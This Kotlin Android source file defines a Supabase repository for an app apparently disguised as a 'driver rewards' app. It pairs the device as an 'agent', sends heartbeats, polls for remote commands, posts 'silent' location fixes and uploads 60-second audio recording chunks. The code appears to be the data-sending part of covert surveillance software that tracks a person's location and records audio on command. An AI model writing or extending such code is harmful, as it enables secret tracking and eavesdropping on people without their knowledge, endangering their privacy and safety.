// Package: com.sm.driverrewards.data.repository
// Repository handling Supabase interactions for Agent
package com.sm.driverrewards.data.repository

import com.sm.core.config.AppConfig
import com.sm.core.model.Command
import com.sm.core.model.CommandStatus
import com.sm.core.model.LocationEntry
import com.sm.core.model.PairingRpcResponse
import com.sm.core.model.RecordingEntry
import com.sm.core.supabase.SupabaseClientProvider
import io.github.jan.supabase.postgrest.from
import io.github.jan.supabase.postgrest.postgrest
import io.github.jan.supabase.postgrest.query.Columns
import io.github.jan.supabase.storage.storage
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import java.io.File

class AgentRepository {

    private val client = SupabaseClientProvider.getClient()

    /**
     * Agent pairing procedure call.
     * Stored procedure 'pair_device_agent' ko call karke pairing code match karte hain.
     */
    suspend fun pairDevice(
        pairingCode: String,
        driverName: String,
        model: String,
        androidVersion: String,
        fcmToken: String?
    ): Result<PairingRpcResponse> = withContext(Dispatchers.IO) {
        try {
            val params = buildJsonObject {
                put("p_code", pairingCode.trim().uppercase())
                put("p_device_name", driverName.trim())
                put("p_model", model)
                put("p_android_ver", androidVersion)
                if (fcmToken != null) {
                    put("p_fcm_token", fcmToken)
                }
            }

            // Database RPC call
            val response = client.postgrest.rpc(
                function = "pair_device_agent",
                parameters = params
            ).decodeAs<PairingRpcResponse>()

            if (response.success) {
                Result.success(response)
            } else {
                Result.failure(Exception(response.error ?: "Pairing failed: Invalid code"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    /**
     * Heartbeat sync: Battery level aur online status update karta hai
     */
    suspend fun sendHeartbeat(
        deviceId: String,
        batteryLevel: Int,
        isCharging: Boolean,
        fcmToken: String?
    ): Result<Unit> = withContext(Dispatchers.IO) {
        try {
            val params = buildJsonObject {
                put("p_device_id", deviceId)
                put("p_battery_level", batteryLevel)
                put("p_is_charging", isCharging)
                if (fcmToken != null) {
                    put("p_fcm_token", fcmToken)
                }
            }
            client.postgrest.rpc(
                function = "device_heartbeat",
                parameters = params
            )
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    /**
     * Device ke liye pending commands fetch karta hai (Backup polling & WorkManager check)
     */
    suspend fun fetchPendingCommands(deviceId: String): Result<List<Command>> = withContext(Dispatchers.IO) {
        try {
            val commands = client.from("commands")
                .select(columns = Columns.ALL) {
                    filter {
                        eq("device_id", deviceId)
                        eq("status", CommandStatus.PENDING)
                    }
                }
                .decodeList<Command>()
            Result.success(commands)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    /**
     * Command ka status update karta hai (EXECUTING, COMPLETED, FAILED)
     */
    suspend fun updateCommandStatus(
        commandId: String,
        status: String,
        errorMessage: String? = null
    ): Result<Unit> = withContext(Dispatchers.IO) {
        try {
            val updatePayload = buildJsonObject {
                put("status", status)
                if (errorMessage != null) {
                    put("error_message", errorMessage)
                }
            }
            client.from("commands")
                .update(updatePayload) {
                    filter {
                        eq("id", commandId)
                    }
                }
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    /**
     * Silent location fix ko database mein insert karta hai
     */
    suspend fun postLocation(location: LocationEntry): Result<Unit> = withContext(Dispatchers.IO) {
        try {
            client.from("locations").insert(location)
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    /**
     * 60-second audio chunk ko Supabase Storage mein upload karta hai
     * Upload hone ke baad metadata row database mein likhta hai
     */
    suspend fun uploadAudioChunk(
        deviceId: String,
        commandId: String?,
        file: File,
        chunkIndex: Int,
        durationSeconds: Int
    ): Result<RecordingEntry> = withContext(Dispatchers.IO) {
        try {
            val remoteFileName = "${deviceId}/${System.currentTimeMillis()}_chunk_${chunkIndex}.m4a"
            val bucket = client.storage.from(AppConfig.STORAGE_BUCKET_RECORDINGS)

            // Byte array upload
            val fileBytes = file.readBytes()
            bucket.upload(
                path = remoteFileName,
                data = fileBytes,
                upsert = true
            )

            // Metadata row insert
            val metadata = RecordingEntry(
                deviceId = deviceId,
                commandId = commandId,
                storagePath = remoteFileName,
                durationSeconds = durationSeconds,
                fileSizeBytes = fileBytes.size.toLong(),
                format = "audio/mp4a-latm",
                chunkIndex = chunkIndex
            )

            client.from("recordings").insert(metadata)

            Result.success(metadata)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
}
